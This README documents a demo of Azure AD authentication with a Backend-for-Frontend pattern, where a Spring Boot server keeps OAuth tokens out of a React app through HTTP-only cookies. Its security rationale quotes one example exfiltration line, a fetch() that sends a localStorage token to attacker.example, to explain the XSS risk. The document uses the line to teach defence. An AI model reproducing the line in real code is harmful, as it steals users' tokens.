<!-- Simplified README (previous detailed reference removed) -->
<br />

# MSAL Secure BFF Authentication Demo

A production-aligned example of Azure AD (Entra ID) authentication using the **Backend for Frontend (BFF)** pattern:

- **React** — SPA that never handles tokens
- **Spring Boot** — BFF that owns the entire OAuth 2.0 + PKCE flow
- **HTTP-only cookies** — the only thing the browser ever sees

> **Goal:** Demonstrate a secure, stateless, production-ready auth pattern with the minimum moving parts needed to understand it and adapt it to your own codebase.

---

## Why Not localStorage?

Storing tokens in `localStorage` or `sessionStorage` is a common mistake that makes your application vulnerable to **Cross-Site Scripting (XSS)**.

Any JavaScript running on your page — including injected scripts from a compromised npm dependency, a browser extension exploit, or a reflected XSS attack — can do:

```js
// Attacker's script silently exfiltrates your token
fetch("https://attacker.example/steal?token=" + localStorage.getItem("access_token"));
```

**HTTP-only cookies cannot be read by JavaScript at all.** `document.cookie` does not expose them; `fetch`/`XMLHttpRequest` cannot read them. The browser sends them automatically on matching requests — and that is the only way they travel.

| Storage | Readable by JS | Stolen via XSS | CSRF risk |
|---|---|---|---|
| `localStorage` | ✅ Yes | ✅ Yes | ❌ No |
| `sessionStorage` | ✅ Yes | ✅ Yes | ❌ No |
| HTTP-only cookie | ❌ No | ❌ No | ⚠️ Mitigated by `SameSite` |

This project uses `SameSite=Strict` (production) or `SameSite=Lax` (development) to mitigate CSRF, making the HTTP-only cookie approach strictly safer than any JavaScript-accessible storage.

---

## Authentication Flow

The full flow is documented in [`docs/token-flow.puml`](docs/token-flow.puml) (open with any PlantUML viewer, e.g. the IntelliJ PlantUML plugin or [plantuml.com](https://www.plantuml.com/plantuml)).

Summarised:

```
┌─────────────┐  1. GET /auth/login  ┌──────────────────────────────────────────┐
│             │─────────────────────▶│                                          │
│   React     │                      │           Spring Boot BFF                │
│   (SPA)     │  2. 302 → Entra ID   │  • Generates PKCE verifier + challenge   │
│             │◀─────────────────────│  • Sets short-lived OAUTH_STATE +        │
│             │                      │    PKCE_VERIFIER cookies (SameSite=Lax)  │
│             │  3. Redirect back    └──────────────────────────────────────────┘
│             │     with auth code               │
│             │─────────────────────────────────▶│
│             │                                  │ 4. Validates CSRF state cookie
│             │                                  │ 5. Exchanges code+verifier
│             │                                  │    with Entra ID (server-side)
│             │                                  │ 6. Sets AUTH_TOKEN cookie
│             │  7. 302 → /?login=success        │    (HttpOnly, Secure, SameSite)
│             │◀─────────────────────────────────│
│             │                                  │
│             │  8. GET /api/hello               │
│             │     (cookie sent automatically)  │
│             │─────────────────────────────────▶│ 9. Validates JWT, populates
│             │                                  │    Spring Security context
│             │  10. JSON response               │
│             │◀─────────────────────────────────│
└─────────────┘                                  └─
```

Key properties:
- The **frontend never sees a token**. It only navigates to `/auth/login` and reads API responses.
- The **auth code exchange** happens server-to-server between the BFF and Entra ID.
- **Refresh tokens** live only in MSAL4J's server-side cache — they never leave the backend. Choose between Redis (clustered) or cookie (infrastructure-free).
- **No server-side session** is used. The MSAL account ID for silent refresh is derived from `oid`+`tid` claims in the JWT already stored in the cookie.

---

## Key Code: Patterns to Adapt

### 1. Requesting a Token (Login + Callback)

The BFF initiates the OAuth 2.0 Authorization Code flow with PKCE. The PKCE verifier and OAuth state (CSRF token) are stored in short-lived `HttpOnly` cookies during the redirect — no server-side session needed.

**`AuthController.java`** — [`backend/src/main/java/com/example/msalbff/controller/AuthController.java`](backend/src/main/java/com/example/msalbff/controller/AuthController.java)

```java
// 1. Initiate login: generate PKCE + state, redirect browser to Entra ID
@GetMapping("/login")
public void startLogin(HttpServletResponse response) {
    String state = UUID.randomUUID().toString();
    authCookieService.setOAuthStateCookie(response, state);  // CSRF protection

    String codeVerifier = generateCodeVerifier();
    authCookieService.setPkceVerifierCookie(response, codeVerifier);

    String authUrl = tokenExchangeService.generateAuthorizationUrl(
        redirectUri, scopes, state, generateCodeChallenge(codeVerifier));
    response.sendRedirect(authUrl);
}

// 2. Handle the callback from Entra ID
@GetMapping("/callback")
public void callback(@RequestParam String code, @RequestParam String state,
                     HttpServletRequest request, HttpServletResponse response) {
    // Validate CSRF state from cookie (returns Optional<String>)
    String expectedState = authCookieService.getOAuthStateCookie(request).orElse(null);
    if (expectedState == null || !expectedState.equals(state)) { /* reject */ }

    // Exchange the auth code for tokens (server-to-server, never exposed to browser)
    String codeVerifier = authCookieService.getPkceVerifierCookie(request).orElse(null);
    authCookieService.clearOAuthFlowCookies(response);

    IAuthenticationResult result = tokenExchangeService
        .exchangeAuthorizationCode(code, redirectUri, scopes, codeVerifier);

    // Store only the ID token in an HTTP-only cookie — access/refresh tokens stay server-side
    authCookieService.setAuthCookie(response, result.idToken());
    response.sendRedirect(frontend + "/?login=success");
}
```

On the frontend, login is simply a navigation — no token handling:

**`authService.js`** — [`frontend/src/services/authService.js`](frontend/src/services/authService.js)

```js
startLogin: () => {
    window.location.href = `${apiConfig.baseUrl}/auth/login`;
}
```

---

### 2. Using a Token (Authenticated API Calls)

The `CookieAuthenticationFilter` runs on every request. It reads the `AUTH_TOKEN` cookie, validates the JWT against Entra ID's JWK Set, and populates the Spring Security context. Protected endpoints just use `@PreAuthorize` or rely on the `SecurityContext` as normal.

**`CookieAuthenticationFilter.java`** — [`backend/src/main/java/com/example/msalbff/security/CookieAuthenticationFilter.java`](backend/src/main/java/com/example/msalbff/security/CookieAuthenticationFilter.java)

```java
@Override
protected void doFilterInternal(HttpServletRequest request,
                                HttpServletResponse response,
                                FilterChain filterChain) throws ServletException, IOException {
    String token = extractTokenFromCookie(request);

    if (token != null) {
        if (tokenValidationService.validateToken(token)) {
            Jwt jwt = tokenValidationService.parseToken(token);
            setAuthentication(jwt);          // Populates SecurityContext

            if (isExpiringSoon(jwt)) {
                tryRefreshToken(token, response);  // Proactive refresh only
            }
        }
        // Invalid/tampered token: do not attempt refresh
    } else {
        // AUTH_TOKEN absent — try to restore session from MSAL token cache
        tryRefreshTokenFromMsalCache(request, response);
    }

    filterChain.doFilter(request, response);
}
```

On the frontend, `withCredentials: true` is the only config needed — the browser handles the rest:

```js
const api = axios.create({
    baseURL: apiConfig.baseUrl,
    withCredentials: true,  // Browser sends the HttpOnly cookie automatically
});

getHelloMessage: async () => api.get('/hello')
```

---

### 3. Refreshing a Token (Silent Refresh)

The filter handles two distinct refresh scenarios:

#### Proactive Refresh (AUTH_TOKEN expiring soon)

When the cookie's JWT is valid but within 5 minutes of expiry, the BFF proactively exchanges the cached refresh token for a new one. The MSAL account ID is derived from the `oid` and `tid` claims in the current JWT — no session or extra storage required.

```java
// Triggered when AUTH_TOKEN is valid but isExpiringSoon() returns true
private void tryRefreshToken(String token, HttpServletResponse response) {
    String homeAccountId = extractHomeAccountId(token);  // Reads oid+tid from JWT claims
    if (homeAccountId == null) return;

    tokenExchangeService.acquireTokenSilently(homeAccountId, scopes).ifPresent(result -> {
        Jwt jwt = tokenValidationService.parseToken(result.idToken());
        setAuthentication(jwt);
        authCookieService.setAuthCookie(response, result.idToken());  // Refreshed cookie
    });
}
```

#### Session Restore (AUTH_TOKEN absent, MSAL cache present)

When the AUTH_TOKEN cookie has expired (its `MaxAge` elapsed and the browser deleted it) but the MSAL token cache is still present, the filter can restore the session without requiring re-login. This is the primary benefit of `app.token-cache.type=cookie`: the `MSAL_TOKEN_CACHE` cookie survives well past the shorter-lived `AUTH_TOKEN`.

```java
// Triggered when AUTH_TOKEN cookie is completely absent
private void tryRefreshTokenFromMsalCache(HttpServletRequest request,
                                          HttpServletResponse response) {
    if (authCookieService.getMsalCacheCookie(request).isEmpty()) return;

    tokenExchangeService.acquireTokenSilentlyFromCache(scopes).ifPresent(result -> {
        Jwt jwt = tokenValidationService.parseToken(result.idToken());
        setAuthentication(jwt);
        authCookieService.setAuthCookie(response, result.idToken());  // Session re-established
    });
}
```

`acquireTokenSilentlyFromCache` calls `msalClient.getAccounts()` which triggers `beforeCacheAccess` to load the MSAL cache (from the encrypted cookie), discovers the cached account, and then performs the refresh token exchange.

> **Redis mode note:** This restore path only triggers when `MSAL_TOKEN_CACHE` cookie is present, which only exists in cookie cache mode. In Redis mode, the session cannot be restored once `AUTH_TOKEN` has expired without a known `homeAccountId`.

---

### 4. Server-Side Token Cache

MSAL4J uses a server-side `ITokenCacheAccessAspect` to persist refresh tokens between requests. This project provides **two implementations** — choose one via `TOKEN_CACHE_TYPE` in `.env`.

#### Option A: Redis (default — for clustered deployments)

Redis is a shared, low-latency key–value store. Every replica reads and writes the same cache:

```
Pod A  → login → Redis["msal:token-cache:oid.tid"] = <encrypted MSAL JSON>
Pod B  → next request → reads Redis["msal:token-cache:oid.tid"] → silent refresh succeeds
```

The cache entry is **keyed per user** by `homeAccountId` (`oid.tid`). Set `TOKEN_CACHE_TYPE=redis` (the default).

**`RedisMsalTokenCache.java`** — [`backend/src/main/java/com/example/msalbff/service/RedisMsalTokenCache.java`](backend/src/main/java/com/example/msalbff/service/RedisMsalTokenCache.java)

| Concern | Mitigation |
|---|---|
| Token cache at rest | AES-256-GCM encryption (`TokenCacheEncryption.java`). Configured via `REDIS_ENCRYPTION_KEY`. |
| Missing key | `SECURITY WARN` logged on startup; tokens stored as plaintext — only acceptable for local dev. |
| Redis outage | `beforeCacheAccess`/`afterCacheAccess` wrapped in try-catch; falls back to empty cache (forces re-auth) rather than 500. |
| Logout invalidation | `POST /auth/logout` derives `homeAccountId` from the `AUTH_TOKEN` cookie and deletes the Redis key immediately. |

#### Option B: Cookie (infrastructure-free — for single-instance deployments)

The entire MSAL token cache is serialised, GZIP-compressed, AES-256-GCM encrypted, and stored in an additional `HttpOnly` cookie. No Redis or any other infrastructure needed.

```
Browser  → every request → sends MSAL_TOKEN_CACHE cookie (encrypted, compressed)
BFF      → decrypts + deserialises → MSAL silently refreshes → re-encrypts + updates cookie
```

Set `TOKEN_CACHE_TYPE=cookie` and provide an encryption key.

**`CookieMsalTokenCache.java`** — [`backend/src/main/java/com/example/msalbff/service/CookieMsalTokenCache.java`](backend/src/main/java/com/example/msalbff/service/CookieMsalTokenCache.java)

| Concern | Mitigation |
|---|---|
| Refresh token at rest | AES-256-GCM with a random 12-byte IV per write. Configured via `TOKEN_CACHE_COOKIE_ENCRYPTION_KEY`. |
| Cookie size limit | Encrypted payload is checked against 4 KB limit before writing. If exceeded, the write is skipped and a warning is logged. Switch to Redis if users have many tokens. |
| `Secure` flag | `TOKEN_CACHE_COOKIE_SECURE=false` for local HTTP dev. Always `true` in production. |
| Logout invalidation | `POST /auth/logout` clears the `MSAL_TOKEN_CACHE` cookie immediately. |
| Key rotation | Changing `TOKEN_CACHE_COOKIE_ENCRYPTION_KEY` silently invalidates all existing cookie caches; users must re-authenticate (graceful degradation — no 500). |

> **When to use cookie mode:** single-instance deployments, local development without Docker, or any setup where you want to eliminate Redis as a dependency. Not suitable for horizontally-scaled (multi-replica) deployments — each browser carries its own cache island.

---

## Project Structure

```
msal/
├── .env.example              ← Template — copy to .env and fill in values
├── configure.sh / .ps1       ← Generates config files from .env
├── runall.sh / .ps1          ← Full build + start both services
├── docker-compose.yml        ← Redis 7 (loopback-only, requirepass, AOF persistence)
├── docs/
│   └── token-flow.puml       ← Full auth flow diagram (PlantUML)
├── frontend/                 ← React SPA
│   └── src/
│       ├── config/msalConfig.js   ← Generated — do not edit
│       ├── services/authService.js
│       └── App.js
└── backend/                  ← Spring Boot BFF
    └── src/main/java/com/example/msalbff/
        ├── config/           ← AppProperties.java, RedisConfig.java
        ├── controller/       ← AuthController.java, SimpleApiController.java
        ├── security/         ← CookieAuthenticationFilter.java, SecurityConfig.java
        └── service/          ← TokenExchangeService.java, TokenValidationService.java,
                                 AuthCookieService.java, MsalTokenCacheService.java (interface),
                                 RedisMsalTokenCache.java, CookieMsalTokenCache.java,
                                 TokenCacheEncryption.java, LogSanitizer.java
```

Generated files (`msalConfig.js`, `application.properties`) are excluded from git. Always edit `.env`.

---

## Running Locally

### Prerequisites

- Java 17+ and Maven
- Node 18+
- Docker (only required when `TOKEN_CACHE_TYPE=redis`)
- An Azure AD App Registration (see [Configuring the App Registration](#configuring-the-app-registration) below)

### Steps

**1. Clone and enter the repository**

```bash
git clone https://github.com/your-org/msal.git
cd msal
```

**2. Create and fill in your `.env` file**

```bash
cp .env.example .env
```

Open `.env` and set at minimum:

```dotenv
AZURE_CLIENT_ID=<your-application-client-id>
AZURE_TENANT_ID=<your-directory-tenant-id>
AZURE_CLIENT_SECRET=<your-client-secret>
```

**3. Choose your token cache backend**

*Cookie mode (no Docker needed):*
```dotenv
TOKEN_CACHE_TYPE=cookie
TOKEN_CACHE_COOKIE_ENCRYPTION_KEY=$(openssl rand -base64 32)
TOKEN_CACHE_COOKIE_SECURE=false   # HTTP only — set true in production
```

*Redis mode (default):*
```dotenv
TOKEN_CACHE_TYPE=redis
REDIS_ENCRYPTION_KEY=$(openssl rand -base64 32)
```

**4. Build and start everything**

```bash
# macOS / Linux
./runall.sh

# Windows
./runall.ps1
```

This will:
1. Generate `frontend/src/config/msalConfig.js` and `backend/src/main/resources/application.properties` from your `.env`
2. Start Redis via `docker compose up -d redis` (only needed for `TOKEN_CACHE_TYPE=redis`)
3. Install frontend npm dependencies
4. Build and test the backend with Maven
5. Open two Terminal windows — one for the backend (`:8080`), one for the frontend (`:3000`)

**5. Open the app**

Navigate to [http://localhost:3000](http://localhost:3000) and click **Sign In with Azure AD**.

### Configuration reference

All configuration lives in `.env`. Running `./configure.sh` (or `./configure.ps1`) at any time regenerates the derived config files without rebuilding.

| Variable | Dev default | Description |
|---|---|---|
| `AZURE_CLIENT_ID` | _(required)_ | Application (client) ID from App Registration |
| `AZURE_TENANT_ID` | _(required)_ | Directory (tenant) ID |
| `AZURE_CLIENT_SECRET` | _(required)_ | Client secret from App Registration |
| `FRONTEND_URL` | `http://localhost:3000` | SPA origin (used for CORS + redirect URI) |
| `BACKEND_URL` | `http://localhost:8080` | BFF origin |
| `COOKIE_SECURE` | `false` | Set to `true` when running over HTTPS |
| `COOKIE_SAME_SITE` | `Lax` | Use `Strict` in production |
| `LOG_LEVEL` | `DEBUG` | Set to `INFO` in production |
| **Token cache** | | |
| `TOKEN_CACHE_TYPE` | `redis` | `redis` or `cookie` — selects the MSAL token cache backend |
| `TOKEN_CACHE_COOKIE_ENCRYPTION_KEY` | _(blank)_ | **Required when `TOKEN_CACHE_TYPE=cookie`.** AES-256-GCM key. Generate: `openssl rand -base64 32` |
| `TOKEN_CACHE_COOKIE_SECURE` | `false` | Set to `true` in production (requires HTTPS) |
| **Redis (only used when `TOKEN_CACHE_TYPE=redis`)** | | |
| `REDIS_HOST` | `localhost` | Redis hostname |
| `REDIS_PORT` | `6379` | Redis port (use `6380` for Azure Cache for Redis TLS) |
| `REDIS_PASSWORD` | `changeme-in-dev` | Redis AUTH password (`requirepass`) |
| `REDIS_TTL` | `90d` | Cache entry TTL (Spring Duration format: `90d`, `3600s`) |
| `REDIS_TLS` | `false` | Enable TLS/SSL — set `true` for Azure Cache for Redis |
| `REDIS_ENCRYPTION_KEY` | _(blank)_ | AES-256-GCM key for cache at rest. **Required for production.** Generate: `openssl rand -base64 32` |

### `application.properties` reference

The following Spring properties are generated from `.env` by `configure.sh`. For reference when editing manually:

```properties
# Token cache selector
app.token-cache.type=cookie               # or: redis

# Cookie cache settings (only used when type=cookie)
app.token-cache.cookie.encryption-key=<base64-key>
app.token-cache.cookie.name=MSAL_TOKEN_CACHE        # optional, default shown
app.token-cache.cookie.max-age=90d                  # optional, default shown
app.token-cache.cookie.secure=true                  # set false for local HTTP dev

# Redis cache settings (only used when type=redis)
app.redis.host=localhost
app.redis.port=6379
app.redis.password=changeme-in-dev
app.redis.ttl=90d
app.redis.tls=false
app.redis.encryption-key=<base64-key>
```

---

## Configuring the App Registration

Create or update an App Registration in [Entra ID (Azure AD)](https://portal.azure.com/#view/Microsoft_AAD_RegisteredApps).

### 1. Register the application

- **Azure Portal** → **Microsoft Entra ID** → **App registrations** → **New registration**
- **Name:** anything descriptive (e.g. `msal-bff-demo`)
- **Supported account types:** _Accounts in this organizational directory only_ (single tenant) or _Any Azure AD directory_ (multi-tenant)
- **Redirect URI:** leave blank for now — you will add it below

### 2. Add the redirect URI

The redirect URI is where Entra ID sends the authorization code after login. In this BFF pattern the redirect goes to the **backend**, not the frontend.

- Go to **Authentication** → **Add a platform** → **Web**
- Add: `http://localhost:3000/api/auth/callback`

> In production replace `http://localhost:3000` with your actual frontend origin and `/api` with your backend context path. The redirect URI must exactly match the value generated in `application.properties` (`app.azure-ad.redirect-uri`).

### 3. Create a client secret

- Go to **Certificates & secrets** → **New client secret**
- Set an expiry and copy the **Value** immediately — it is only shown once
- Paste it into `.env` as `AZURE_CLIENT_SECRET`

### 4. Expose the required API permissions

- Go to **API permissions** → **Add a permission** → **Microsoft Graph** → **Delegated**
- Add: `openid`, `profile`, `email`, `offline_access`, `User.Read`
- Click **Grant admin consent** (required for `offline_access` which provides the refresh token)

### 5. Verify the token configuration

- Go to **Token configuration**
- Confirm the ID token includes the `oid` and `tid` optional claims (they are present by default for v2 tokens)

### Summary of values to copy into `.env`

| `.env` variable | Where to find it |
|---|---|
| `AZURE_CLIENT_ID` | App Registration **Overview** → Application (client) ID |
| `AZURE_TENANT_ID` | App Registration **Overview** → Directory (tenant) ID |
| `AZURE_CLIENT_SECRET` | **Certificates & secrets** → Value (copy at creation time) |

---

## Security Summary

| Aspect | Approach |
|---|---|
| **Token storage** | ID token in `HttpOnly` cookie only — never in JS-accessible storage |
| **XSS protection** | `HttpOnly` flag prevents JavaScript from reading the cookie |
| **CSRF protection** | `SameSite=Strict` (prod) / `SameSite=Lax` (dev) + `state` parameter check |
| **PKCE** | Code verifier stored in a short-lived `HttpOnly` cookie; never in JS |
| **Refresh tokens** | Server-side only (MSAL4J cache); never sent to browser |
| **Token cache at rest (Redis)** | AES-256-GCM encryption in Redis (per-entry random IV); configured via `REDIS_ENCRYPTION_KEY` |
| **Token cache at rest (Cookie)** | AES-256-GCM encryption in `HttpOnly` cookie (per-write random IV); configured via `TOKEN_CACHE_COOKIE_ENCRYPTION_KEY`. `Secure` flag enforced by default. |
| **Token cache isolation** | Per-user key (`msal:token-cache:{oid.tid}` for Redis; per-browser cookie for cookie mode); logout triggers immediate eviction |
| **Redis network** | Dev: loopback-only (`127.0.0.1`), `requirepass`. Prod: TLS via `REDIS_TLS=true` |
| **Token validation** | Signature verified against Entra ID JWK Set; `iss`, `aud`, `exp` checked |
| **Stateless backend** | No `HttpSession` used — `homeAccountId` derived from JWT `oid`+`tid` claims |

---

## API Endpoints

| Endpoint | Method | Auth | Purpose |
|---|---|---|---|
| `/api/health` | GET | No | Liveness check |
| `/api/auth/login` | GET | No | Initiates PKCE login flow, redirects to Entra ID |
| `/api/auth/callback` | GET | No | Receives auth code, exchanges for tokens, sets cookie |
| `/api/auth/logout` | POST | No | Expires the `AUTH_TOKEN` cookie and evicts the token cache |
| `/api/hello` | GET | ✅ | Sample protected endpoint |
| `/api/userinfo` | GET | ✅ | Returns claims from the validated JWT |

---

## Troubleshooting

| Symptom | Likely cause | Fix |
|---|---|---|
| Redirect loop after login | Redirect URI mismatch | Ensure `FRONTEND_URL + /api/auth/callback` matches exactly what is registered in Entra ID |
| `AADSTS50011` error | Redirect URI not registered | Add `http://localhost:3000/api/auth/callback` under **Authentication → Web** |
| `401` on protected endpoints | Cookie not sent or expired | Check `COOKIE_SECURE=false` for local HTTP; check CORS `allowCredentials` |
| CORS error | Origin mismatch | `FRONTEND_URL` in `.env` must match the browser's origin exactly |
| Cookie missing in dev tools | `HttpOnly` hides it from the JS console | Use the **Application → Cookies** tab in DevTools; it will be listed there |
| Silent refresh not working | `offline_access` scope missing or admin consent not granted | Add `offline_access` and grant admin consent in Entra ID |
| `IllegalArgumentException: app.token-cache.cookie.encryption-key must be set` | `TOKEN_CACHE_TYPE=cookie` but no key provided | Set `TOKEN_CACHE_COOKIE_ENCRYPTION_KEY` in `.env` and re-run `./configure.sh` |
| Cookie cache: silent refresh fails after key change | Encryption key was rotated | Expected — all cookie caches are silently invalidated; users must re-authenticate once |
| Cookie cache: "payload exceeds 4 KB" warning in logs | User has many tokens (e.g. many Graph scopes) | Switch to `TOKEN_CACHE_TYPE=redis` |
| Backend restart loses sessions (Redis mode) | Redis is down or unreachable | MSAL4J refresh tokens are stored in Redis and survive pod restarts. If Redis is unavailable, users must re-authenticate. |
| Backend restart loses sessions (Cookie mode) | Expected if encryption key changed | Users must re-authenticate. If the key is stable, cookie caches survive restarts. |

---

## Production Checklist

- [ ] `COOKIE_SECURE=true` (requires HTTPS)
- [ ] `COOKIE_SAME_SITE=Strict`
- [ ] `LOG_LEVEL=INFO`
- [ ] `TOKEN_CACHE_COOKIE_SECURE=true` (when using cookie cache)
- [ ] Set encryption key for your chosen cache:
  - Cookie mode: `TOKEN_CACHE_COOKIE_ENCRYPTION_KEY=$(openssl rand -base64 32)`
  - Redis mode: `REDIS_ENCRYPTION_KEY=$(openssl rand -base64 32)`
- [ ] Redis mode only: set `REDIS_TLS=true` and `REDIS_PORT=6380` for Azure Cache for Redis (TLS endpoint)
- [ ] Store all secrets (`TOKEN_CACHE_COOKIE_ENCRYPTION_KEY`, `REDIS_ENCRYPTION_KEY`, `REDIS_PASSWORD`, `AZURE_CLIENT_SECRET`) in a secrets manager (e.g. Azure Key Vault)
- [ ] Cookie mode: not suitable for multi-replica/AKS deployments — use Redis mode instead
- [ ] Set security headers: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`
- [ ] Rotate client secrets regularly
- [ ] Enable Conditional Access policies and token protection in Entra ID

---

## Useful References

- [MSAL4J documentation](https://learn.microsoft.com/en-us/azure/active-directory/develop/msal-java-get-started)
- [OAuth 2.0 Authorization Code Flow with PKCE](https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow)
- [Spring Security OAuth2 Resource Server](https://docs.spring.io/spring-security/reference/servlet/oauth2/resource-server/index.html)
- [OWASP: HTML5 Security — localStorage](https://cheatsheetseries.owasp.org/cheatsheets/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage)
- [OWASP: Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/cheatsheets/Session_Management_Cheat_Sheet.html)

---

*Minimal surface. Clear responsibilities. Secure defaults.*

**Happy Authenticating!** 🔐
